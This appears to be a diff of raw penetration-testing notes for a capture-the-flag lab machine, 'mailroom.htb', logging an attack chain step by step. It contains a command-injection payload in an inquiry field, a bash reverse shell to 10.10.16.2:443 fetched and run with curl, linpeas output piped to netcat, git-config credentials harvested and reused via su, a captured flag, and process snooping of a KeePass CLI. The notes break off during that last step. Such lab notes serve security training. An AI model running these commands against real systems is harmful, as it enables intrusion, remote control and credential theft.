+        for <tristan@mailroom.htb>; Sat, 29 Apr 2023 08:29:39 +0000 (UTC)
+Subject: 2FA
+
+Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=2ae54400b0cfd8e696c53b1eba2d444a
+
+cat /var/spool/mail/tristan
+Return-Path: <noreply@mailroom.htb>
+X-Original-To: tristan@mailroom.htb
+Delivered-To: tristan@mailroom.htb
+Received: from localhost (unknown [172.19.0.5])
+        by mailroom.localdomain (Postfix) with SMTP id 5586A1CCC
+        for <tristan@mailroom.htb>; Sat, 29 Apr 2023 08:29:39 +0000 (UTC)
+Subject: 2FA
+
+Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=2ae54400b0cfd8e696c53b1eba2d444a
+
+//From BURP proxy through SSH SOCKS proxy navigate to link found in mail
+
+//Browse
+http://staff-review-panel.mailroom.htb/auth.php?token=2ae54400b0cfd8e696c53b1eba2d444a
+
+//SUCCESS
+
+//Page loads with Recent Inqueries:
+//InquriyID: 5657465f7712d50b2aaceaa09453c71f
+//Manual review is required - Irrelevent inqueries were omitted
+//Please use the inspection tool to view and handle the inqueries
+
+//From staffroom/inspect.php
+$data = '';
+if (isset($_POST['inquiry_id'])) {
+  $inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['inquiry_id']);
+  $contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");
+//Code can be inject into inquiry_id
+
+//Browse
+http://staff-review-panel.mailroom.htb/inspect.php
+
+//Test Read Inqueries:
+	5657465f7712d50b2aaceaa09453c71f
+Hi, this is a test inquiry to see the new system in action! I'm so excited! (Contact me back on: matthew@mailroom.htb)
+
+//Test Read Inqueries:
+	`ping -c5 10.10.16.2`
+	//FAIL
+	`wget http://10.10.16.2`
+	//FAIL
+	`curl http://10.10.16.2`
+	//SUCCESS
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// REvShell
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Create a revshell to cURL
+// revshell.sh
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+#!/usr/bin/env bash
+/bin/bash -i >& /dev/tcp/10.10.16.2/443 0>&1
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//Start WebListener
+python3 -m http.server 80
+
+//Stare RevShell Listener
+sudo rlwrap -cAr nc -lvnp 443
+
+//Download File to target
+2023-04-29 04:45:04 CDT -- 
+`curl http://10.10.16.2:80/revshell.sh -o /tmp/revshell`
+
+//Run RevShell
+2023-04-29 04:45:07 CDT -- 
+`bash /tmp/revshell`
+
+//SUCCESS
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// ENUM (www-data)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+hostname
+76ad639f22e1
+
+uname -a
+Linux 76ad639f22e1 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 GNU/Linux
+
+cat /etc/*elease
+PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
+
+ps -ef fw
+UID          PID    PPID  C STIME TTY      STAT   TIME CMD
+root           1       0  0 03:54 ?        Ss     0:02 apache2 -DFOREGROUND
+www-data   41142       1  0 06:47 ?        S      0:03 apache2 -DFOREGROUND
+www-data   49289   41142  0 09:49 ?        S      0:00  \_ sh -c cat /var/www/mailroom/inquiries/`bash /tmp/revshell`.html
+www-data   49290   49289  0 09:49 ?        S      0:00      \_ bash /tmp/revshell
+www-data   49291   49290  0 09:49 ?        S      0:00          \_ /bin/bash -i
+www-data   49310   49291  0 10:01 ?        R      0:00              \_ ps -ef fw
+
+netstat -ant
+//Command Not Found
+
+//This may be a container
+
+ls -lah
+total 68K
+drwxr-xr-x 7 root root 4.0K Jan 19 10:54 .
+drwxr-xr-x 5 root root 4.0K Jan 15 17:58 ..
+drwxr-xr-x 8 root root 4.0K Jan 19 10:56 .git
+-rw-r--r-- 1 root root    0 Jan 15 17:59 README.md
+-rwxr-xr-x 1 root root 3.4K Jan 19 10:54 auth.php
+-rwxr-xr-x 1 root root   62 Jan 15 17:59 composer.json
+-rwxr-xr-x 1 root root 8.0K Jan 15 17:59 composer.lock
+drwxr-xr-x 2 root root 4.0K Jan 15 17:59 css
+-rwxr-xr-x 1 root root 5.8K Jan 19 10:52 dashboard.php
+drwxr-xr-x 3 root root 4.0K Jan 15 17:59 font
+-rwxr-xr-x 1 root root 2.6K Jan 15 17:59 index.php
+-rwxr-xr-x 1 root root 6.2K Jan 18 13:26 inspect.php
+drwxr-xr-x 2 root root 4.0K Jan 15 17:59 js
+-rwxr-xr-x 1 root root  953 Jan 15 17:59 register.html
+drwxr-xr-x 6 root root 4.0K Jan 15 17:59 vendor
+
+
+// privesc --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// download, execute from memory, & save output on kali
+  // kali term1
+sudo python3 -m http.server 80
+  // kali term2
+nc -lvnp 443 | tee linpeas_wwwData.out
+
+2023-04-29 05:07:13 CDT -- 
+// target
+curl 10.10.16.2:80/linpeas.sh | sh | nc 10.10.16.2 443
+
+less -r linpeas.out
+
+//Interesting
+═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                             
+                                   ╚═══════════╝                                                                                
+╔══════════╣ Container related tools present (if any):
+╔══════════╣ Am I Containered?                                                                                                  
+╔══════════╣ Container details                                                                                                  
+═╣ Is this a container? ........... docker                                                                                      
+═╣ Any running containers? ........ No
+╔══════════╣ Docker Container details                                                                                           
+═╣ Am I inside Docker group ....... No                                                                                          
+═╣ Looking and enumerating Docker Sockets (if any):
+═╣ Docker version ................. Not Found                                                                                   
+═╣ Vulnerable to CVE-2019-5736 .... Not Found                                                                                   
+═╣ Vulnerable to CVE-2019-13139 ... Not Found                                                                                   
+═╣ Rootless Docker? ............... No
+
+
+══╣ Breakout via mounts
+═╣ /proc/sched_debug readable ..... Yes                                                                                         
+═╣ /proc/*/mountinfo readable ..... Yes
+═╣ /sys/kernel/security present ... Yes
+
+╔══════════╣ Hostname, hosts and DNS
+76ad639f22e1                                                                                                                    
+127.0.0.1       localhost
+::1     localhost ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+172.19.0.5      76ad639f22e1
+nameserver 127.0.0.11
+options edns0 trust-ad ndots:0
+
+══╣ Possible private SSH keys were found!
+/var/www/staffroom/vendor/mongodb/mongodb/.evergreen/x509gen/client.pem
+/var/www/staffroom/vendor/mongodb/mongodb/.evergreen/x509gen/password_protected.pem
+/var/www/staffroom/vendor/mongodb/mongodb/.evergreen/x509gen/altname.pem
+/var/www/staffroom/vendor/mongodb/mongodb/.evergreen/x509gen/client-private.pem
+/var/www/staffroom/vendor/mongodb/mongodb/.evergreen/x509gen/commonName.pem
+/var/www/staffroom/vendor/mongodb/mongodb/.evergreen/x509gen/server.pem
+/var/www/staffroom/vendor/mongodb/mongodb/.evergreen/x509gen/expired.pem
+/var/www/staffroom/vendor/mongodb/mongodb/.evergreen/x509gen/wild.pem
+/var/www/staffroom/vendor/mongodb/mongodb/mongo-orchestration/ssl/client.pem
+/var/www/staffroom/vendor/mongodb/mongodb/mongo-orchestration/ssl/server.pem
+
+drwxr-xr-x 8 root root 4096 Jan 19 10:57 /var/www/mailroom/.git
+drwxr-xr-x 8 root root 4096 Jan 19 10:56 /var/www/staffroom/.git
+
+╔══════════╣ Unexpected in root
+/.dockerenv
+
+2023-04-29 05:23:30 CDT -- 
+cat /var/www/staffroom/.git/config
+</staffroom/.git$ cat /var/www/staffroom/.git/config
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[remote "origin"]
+        url = http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git
+        fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+        remote = origin
+        merge = refs/heads/main
+[user]
+        email = matthew@mailroom.htb
+
+//CREDS:
+	//User: matthew
+	//Pass: HueLover83%23 (HueLover83#)
+
+//-/var/www/staffroom/.git has the same info
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// SSH Connect
+	//User: matthew@mailroom.htb
+    //Pass: HueLover83# 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-29 05:32:42 CDT -- 
+// connect SSH
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" matthew@mailroom.htb
+
+//FAIL
+matthew@mailroom.htb: Permission denied (publickey).
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// su to Matthew
+	//User: matthew@mailroom.htb
+    //Pass: HueLover83#
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-29 06:16:10 CDT -- 
+su - matthew
+
+//SUCCESS
+
+id
+uid=1001(matthew) gid=1001(matthew) groups=1001(matthew)
+
+cat user.txt 
+// 6e28d2a70bd32f40077136739aa6e9bd
+
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// ENUM (matthew)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+sudo -ll
+Sorry, user matthew may not run sudo on mailroom.
+
+ps -ef fw
+UID          PID    PPID  C STIME TTY      STAT   TIME CMD
+matthew   133697  133689  1 11:20 ?        Ss     0:00 /usr/bin/perl /usr/bin/kpcli
+matthew   133175  133130  0 11:16 pts/1    S      0:00 -bash
+matthew   133707  133175  0 11:20 pts/1    R+     0:00  \_ ps -ef fw
+matthew   133691       1  1 11:20 ?        Ss     0:00 /lib/systemd/systemd --user
+
+
+// privesc --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// download, execute from memory, & save output on kali
+  // kali term1
+sudo python3 -m http.server 80
+  // kali term2
+nc -lvnp 443 | tee linpeas_matthew.out
+
+2023-04-29 06:23:53 CDT -- 
+// target
+curl 10.10.16.2:80/linpeas.sh | sh | nc 10.10.16.2 443
+
+less -r linpeas.out
+
+//Interesting
+//No real changes from previous linpeas
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// pspy
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// get a copy of pspy
+// download pspy64
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+
+cd ~
+
+
+// upload to target
+wget http://10.10.16.2:80/pspy64
+
+// execute pspy
+chmod +x pspy64
+
+2023-04-29 06:32:33 CDT -- 
+./pspy64
+
+2023/04/29 11:32:31 CMD: UID=1001  PID=149873 | -bash -c /usr/bin/kpcli 
+2023/04/29 11:32:31 CMD: UID=1001  PID=149874 | -bash -c /usr/bin/kpcli 
+2023/04/29 11:32:31 CMD: UID=1001  PID=149875 | /usr/bin/perl /usr/bin/kpcli
+
+//Lets look into kpcli
+//A simple command line tool to interact with KeePassX databases.
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+## Need to look more into kpcli process
+strace -p $(ps -ef | egrep 'kpcli|perl' | egrep -v 'grep' | awk '{ print $2 }')
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
 
